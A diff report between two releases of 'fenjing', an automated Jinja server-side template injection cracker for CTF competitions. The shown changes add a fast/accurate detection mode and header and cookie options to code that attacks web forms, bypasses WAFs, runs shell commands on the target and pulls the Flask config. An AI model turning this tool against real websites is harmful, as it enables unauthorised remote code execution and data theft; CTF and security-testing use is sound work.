# Comparing `tmp/fenjing-0.4.4.tar.gz` & `tmp/fenjing-0.4.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.4.tar", last modified: Sat Jul  8 13:38:09 2023, max compression
+gzip compressed data, was "fenjing-0.4.5.tar", last modified: Sat Jul  8 15:33:37 2023, max compression
```

## Comparing `fenjing-0.4.4.tar` & `fenjing-0.4.5.tar`

### file list

```diff
@@ -1,37 +1,37 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 13:38:09.305641 fenjing-0.4.4/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-08 13:37:59.000000 fenjing-0.4.4/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-08 13:37:59.000000 fenjing-0.4.4/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-08 13:38:09.301641 fenjing-0.4.4/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6120 2023-07-08 13:37:59.000000 fenjing-0.4.4/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 13:37:59.000000 fenjing-0.4.4/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 13:38:09.301641 fenjing-0.4.4/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     8524 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1850 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     6583 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7292 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    31678 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 13:38:09.301641 fenjing-0.4.4/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     5074 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-08 13:37:59.000000 fenjing-0.4.4/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 13:38:09.301641 fenjing-0.4.4/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-08 13:38:09.000000 fenjing-0.4.4/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-08 13:38:09.000000 fenjing-0.4.4/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 13:38:09.000000 fenjing-0.4.4/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 13:38:09.000000 fenjing-0.4.4/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-08 13:38:09.000000 fenjing-0.4.4/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 13:37:59.000000 fenjing-0.4.4/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 13:38:09.305641 fenjing-0.4.4/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-08 13:37:59.000000 fenjing-0.4.4/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 13:38:09.301641 fenjing-0.4.4/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     7156 2023-07-08 13:37:59.000000 fenjing-0.4.4/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-08 13:37:59.000000 fenjing-0.4.4/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-08 15:33:27.000000 fenjing-0.4.5/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-08 15:33:27.000000 fenjing-0.4.5/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-08 15:33:37.901622 fenjing-0.4.5/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     6735 2023-07-08 15:33:27.000000 fenjing-0.4.5/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 15:33:27.000000 fenjing-0.4.5/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9136 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1834 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6814 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7473 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    32102 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     4866 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-08 15:33:27.000000 fenjing-0.4.5/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     7172 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-08 15:33:37.000000 fenjing-0.4.5/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 15:33:27.000000 fenjing-0.4.5/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 15:33:37.901622 fenjing-0.4.5/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-08 15:33:27.000000 fenjing-0.4.5/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 15:33:37.901622 fenjing-0.4.5/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-08 15:33:27.000000 fenjing-0.4.5/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-08 15:33:27.000000 fenjing-0.4.5/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.4/LICENSE` & `fenjing-0.4.5/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/PKG-INFO` & `fenjing-0.4.5/PKG-INFO`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.4
+Version: 0.4.5
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -22,14 +22,15 @@
 ![demo](assets/demo.webp)
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
+- 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -140,45 +141,58 @@
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
+  扫描指定的网站
+
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
+  攻击指定的表单
+
 Options:
   -u, --url TEXT       form所在的URL
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
 Options:
-  -u, --url TEXT     form所在的URL
-  -a, --action TEXT  form的action，默认为当前路径
-  -m, --method TEXT  form的提交方式，默认为POST
-  -i, --inputs TEXT  form的参数，以逗号分隔
-  --interval FLOAT   每次请求的间隔
-  --user-agent TEXT  请求时使用的User Agent
-  --help             Show this message and exit.
+  -u, --url TEXT      form所在的URL
+  -a, --action TEXT   form的action，默认为当前路径
+  -m, --method TEXT   form的提交方式，默认为POST
+  -i, --inputs TEXT   form的参数，以逗号分隔
+  --interval FLOAT    每次请求的间隔
+  --detect-mode TEXT  分析模式，可为accurate或fast
+  --user-agent TEXT   请求时使用的User Agent
+  --header TEXT       请求时使用的Headers
+  --cookies TEXT      请求时使用的Cookie
+  --help              Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
```

### Comparing `fenjing-0.4.4/README.md` & `fenjing-0.4.5/fenjing.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,7 +1,20 @@
+Metadata-Version: 2.1
+Name: fenjing
+Version: 0.4.5
+Summary: A Jinja SSTI cracker for CTF competitions
+Home-page: https://github.com/Marven11/Fenjing
+Author: Marven11
+Author-email: marven11@example.com
+Classifier: Programming Language :: Python :: 3.7
+Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
+Classifier: Operating System :: OS Independent
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。
 
 ## 演示
@@ -9,14 +22,15 @@
 ![demo](assets/demo.webp)
 
 ## 主要特性
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
+- 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -127,45 +141,58 @@
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
+  扫描指定的网站
+
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
+  攻击指定的表单
+
 Options:
   -u, --url TEXT       form所在的URL
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
+  --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
+  --header TEXT        请求时使用的Headers
+  --cookies TEXT       请求时使用的Cookie
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
 Options:
-  -u, --url TEXT     form所在的URL
-  -a, --action TEXT  form的action，默认为当前路径
-  -m, --method TEXT  form的提交方式，默认为POST
-  -i, --inputs TEXT  form的参数，以逗号分隔
-  --interval FLOAT   每次请求的间隔
-  --user-agent TEXT  请求时使用的User Agent
-  --help             Show this message and exit.
+  -u, --url TEXT      form所在的URL
+  -a, --action TEXT   form的action，默认为当前路径
+  -m, --method TEXT   form的提交方式，默认为POST
+  -i, --inputs TEXT   form的参数，以逗号分隔
+  --interval FLOAT    每次请求的间隔
+  --detect-mode TEXT  分析模式，可为accurate或fast
+  --user-agent TEXT   请求时使用的User Agent
+  --header TEXT       请求时使用的Headers
+  --cookies TEXT      请求时使用的Cookie
+  --help              Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
```

### Comparing `fenjing-0.4.4/fenjing/cli.py` & `fenjing-0.4.5/fenjing/cli.py`

 * *Files 10% similar despite different names*

```diff
@@ -15,27 +15,30 @@
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
 from .const import (
     OS_POPEN_READ,
     DEFAULT_USER_AGENT,
     CONFIG,
+    DETECT_MODE_ACCURATE,
 )
 from .colorize import colored
 from .webui import main as webui_main
 
 TITLE = colored(
     "yellow",
     r"""
     ____             _ _
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
  / __/  __/ / / / / / / / / / /_/ /
 /_/  \___/_/ /_/_/ /_/_/ /_/\__, /
               /___/        /____/
+
+    ------Made with passion by Marven11
 """.strip(
         "\n"
     ),
     bold=True,
 )
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 
@@ -118,24 +121,28 @@
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
+)
+@click.option(
     "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
 )
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 def get_config(
     url: str,
     action: str,
     method: str,
     inputs: str,
     interval: float,
+    detect_mode: str,
     user_agent: str,
     header: tuple,
     cookies: str,
 ):
     """
     攻击指定的表单，并获得目标服务器的flask config
     """
@@ -151,15 +158,17 @@
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(url=url, form=form, requester=requester)
+    cracker = FormCracker(
+        url=url, form=form, requester=requester, detect_mode=detect_mode
+    )
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     full_payload_gen, field = result
     payload = full_payload_gen.generate(CONFIG)
     resp = cracker.submit({field: payload})
@@ -174,25 +183,29 @@
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option(
     "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
 )
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
+)
+@click.option(
     "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
 )
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 def crack(
     url: str,
     action: str,
     method: str,
     inputs: str,
     exec_cmd: str,
     interval: float,
+    detect_mode: str,
     user_agent: str,
     header: tuple,
     cookies: str,
 ):
     """
     攻击指定的表单
     """
@@ -208,15 +221,17 @@
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(url=url, form=form, requester=requester)
+    cracker = FormCracker(
+        url=url, form=form, requester=requester, detect_mode=detect_mode
+    )
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     full_payload_gen, field = result
     cmd_exec_func = partial(
         cmd_exec,
@@ -232,34 +247,40 @@
 
 
 @main.command()
 @click.option("--url", "-u", help="需要扫描的URL")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
+)
+@click.option(
     "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
 )
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
-def scan(url, exec_cmd, interval, user_agent, header, cookies):
+def scan(url, exec_cmd, interval, detect_mode, user_agent, header, cookies):
     """
     扫描指定的网站
     """
     print(TITLE)
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
         headers=parse_headers_cookies(
             headers_list=list(header), cookies=cookies
         ),
     )
     for page_url, forms in yield_form(requester, url):
         for form in forms:
             cracker = FormCracker(
-                url=page_url, form=form, requester=requester
+                url=page_url,
+                form=form,
+                requester=requester,
+                detect_mode=detect_mode,
             )
             result = cracker.crack()
             if result is None:
                 continue
             full_payload_gen, field = result
             cmd_exec_func = partial(
                 cmd_exec,
```

### Comparing `fenjing-0.4.4/fenjing/colorize.py` & `fenjing-0.4.5/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/config_payload.py` & `fenjing-0.4.5/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/const.py` & `fenjing-0.4.5/fenjing/const.py`

 * *Files 8% similar despite different names*

```diff
@@ -69,11 +69,11 @@
 CALLBACK_TEST_FORM_INPUT = "test_form_input"
 
 # WEBUI的接口返回值
 
 APICODE_OK = 200
 APICODE_WRONG_INPUT = 401
 
-# 生成WAF函数时获取WAF后页面哈希的模式
+# 程序检测的目标模式：快速或精确
 
-WAF_PAGE_SAMPLE_MODE_FAST = "fast"
-WAF_PAGE_SAMPLE_MODE_FULL = "full"
+DETECT_MODE_FAST = "fast"
+DETECT_MODE_ACCURATE = "accurate"
```

### Comparing `fenjing-0.4.4/fenjing/context_vars.py` & `fenjing-0.4.5/fenjing/context_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/form.py` & `fenjing-0.4.5/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.4/fenjing/form_cracker.py` & `fenjing-0.4.5/fenjing/form_cracker.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,22 +1,23 @@
 """攻击指定的表单
 
 """
 
 from collections import namedtuple
 import logging
-from typing import List, Dict, Any, Union, Callable
+from typing import List, Dict, Union, Callable
 
-from .form import random_fill, fill_form
+from .form import random_fill, fill_form, Form
 from .requester import Requester
 from .colorize import colored
 from .const import (
     CALLBACK_SUBMIT,
     CALLBACK_TEST_FORM_INPUT,
     OS_POPEN_READ,
+    DETECT_MODE_ACCURATE,
 )
 from .waf_func_gen import WafFuncGen
 from .full_payload_gen import FullPayloadGen
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
@@ -30,17 +31,18 @@
     test_cmd = "echo f3n  j1ng;"
     test_result = "f3n j1ng"
     test_vulunable_inputs_times = 5
 
     def __init__(
         self,
         url: str,
-        form: Dict[str, Any],
+        form: Form,
         requester: Requester,
         callback: Union[Callable[[str, Dict], None], None] = None,
+        detect_mode: str = DETECT_MODE_ACCURATE,
     ):
         """生成用于攻击form的类
 
         Args:
             url (str, optional): form所在的url.
             form (dict): 解析后的form元素
             requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
@@ -50,16 +52,21 @@
         self.url = url
         self.form = form
         self.req = requester
         self._callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
         self.waf_func_gen = WafFuncGen(
-            self.url, self.form, self.req, self.callback
+            self.url,
+            self.form,
+            self.req,
+            self.callback,
+            detect_mode=detect_mode,
         )
+        self.detect_mode = detect_mode
 
     @property
     def callback(self):
         """Callback函数
 
         Returns:
             Callable: Callback函数
@@ -142,15 +149,17 @@
 
         Returns:
             Union[Result, None]: 对应的payload生成函数，以及对应的input
         """
         logger.info("Testing %s", colored("yellow", input_field))
 
         waf_func = self.waf_func_gen.generate(input_field)
-        full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
+        full_payload_gen = FullPayloadGen(
+            waf_func, callback=self.callback, detect_mode=self.detect_mode
+        )
         payload, will_print = full_payload_gen.generate(
             OS_POPEN_READ, self.test_cmd
         )
         if payload is None:
             self.callback(
                 CALLBACK_TEST_FORM_INPUT,
                 {
```

### Comparing `fenjing-0.4.4/fenjing/full_payload_gen.py` & `fenjing-0.4.5/fenjing/full_payload_gen.py`

 * *Files 9% similar despite different names*

```diff
@@ -11,14 +11,15 @@
     context_payloads_all,
     filter_by_used_context,
     filter_by_waf,
 )
 from .const import (
     CALLBACK_PREPARE_FULLPAYLOADGEN,
     CALLBACK_GENERATE_FULLPAYLOAD,
+    DETECT_MODE_ACCURATE,
 )
 
 logger = logging.getLogger("shell_payload")
 
 
 def get_outer_pattern(
     waf_func: Callable,
@@ -77,14 +78,15 @@
         waf_func: Callable[
             [
                 str,
             ],
             bool,
         ],
         callback: Union[Callable[[str, Dict], None], None] = None,
+        detect_mode: str = DETECT_MODE_ACCURATE,
     ):
         self.__slot__ = [
             "waf_func",
             "prepared",
             "_callback",
             "context_payload",
             "context",
@@ -96,14 +98,15 @@
         self._callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
         self.context_payload = context_payloads_all
         self.context = context_payloads_to_context(self.context_payload)
         self.outer_pattern, self.will_print = None, None
         self.payload_gen = None
+        self.detect_mode = detect_mode
 
     @property
     def callback(self):
         """Callback函数，在进行某些步骤是会被调用以传递运行时的信息
 
         Returns:
             Callable: callback函数
@@ -140,15 +143,18 @@
             logger.warning(
                 "use %s, which %s your result!",
                 colored("blue", self.outer_pattern),
                 colored("red", "will not print"),
             )
 
         self.payload_gen = payload_gen.PayloadGenerator(
-            self.waf_func, self.context, self.callback
+            self.waf_func,
+            self.context,
+            self.callback,
+            detect_mode=self.detect_mode,
         )
         self.prepared = True
         self.callback(
             CALLBACK_PREPARE_FULLPAYLOADGEN,
             {
                 "context": self.context,
                 "outer_pattern": self.outer_pattern,
```

### Comparing `fenjing-0.4.4/fenjing/payload_gen.py` & `fenjing-0.4.5/fenjing/payload_gen.py`

 * *Files 1% similar despite different names*

```diff
@@ -13,17 +13,27 @@
 
 ReqGenRequirements = List[ReqGenRequirement]
 ReqGenReturn = ReqGenRequirements
 ReqGen = Callable[..., ReqGenReturn]
 ReqGenResult = Tuple[str, ContextVariable]
 
 req_gens: DefaultDict[str, List[ReqGen]] = defaultdict(list)
-used_count = defaultdict(int)
 logger = logging.getLogger("payload_gen")
 
+gen_weight_default = {
+    "gen_string_percent_lower_c_concat": 1,
+    "gen_string_lower_c_joinerbatch": 1,
+    "gen_string_percent_urlencode2": 1,
+    "gen_string_x1": 1,
+    "gen_string_x2": 1,
+    "gen_string_formatpercent": 1,
+    "gen_attribute_attrfilter": 1,
+    "gen_item_dunderfunc": 1
+}
+
 
 def req_gen(f: ReqGen):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
@@ -38,14 +48,15 @@
 
 class PayloadGenerator:
     def __init__(
         self,
         waf_func: Callable[[str], bool],
         context: Union[Dict, None],
         callback: Union[Callable[[str, Dict], None], None] = None,
+        detect_mode: str = DETECT_MODE_ACCURATE
     ):
         self.waf_func = waf_func
         self.context = context if context else {}
         self.cache = {}
         self.generate_funcs: List[
             Tuple[
                 Callable[[ReqGenRequirement], bool],
@@ -64,16 +75,19 @@
             ),
             (
                 (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
                 (lambda gen_req: self.cache[gen_req]),
             ),
             ((lambda gen_req: True), self.common_generate),
         ]
-        # LITERAL: self.literal_generate,
-        # UNSATISFIED: self.unsatisfied_generate
+        self.used_count = defaultdict(int)
+
+        if detect_mode == DETECT_MODE_FAST:
+            for k in gen_weight_default:
+                self.used_count[k] += gen_weight_default[k]
 
         self.callback = callback if callback else (lambda x, y: None)
 
     def generate_by_list(
         self, req_list: List[ReqGenRequirement]
     ) -> Union[ReqGenResult, None]:
         str_result, used_context = "", {}
@@ -100,15 +114,15 @@
         gen_type: str
         gen_type, *args = gen_req
         if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
         gens = req_gens[gen_type].copy()
-        gens.sort(key=lambda gen: used_count[gen.__name__], reverse=True)
+        gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
             ret = self.generate_by_list(gen(self.context, *args))
             if ret is None:
                 continue
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
@@ -143,15 +157,15 @@
                             "yellow", ", ".join(repr(arg) for arg in args)
                         ),
                     )
                 )
 
             if hashable(gen_req):
                 self.cache[gen_req] = ret
-            used_count[gen.__name__] += 1
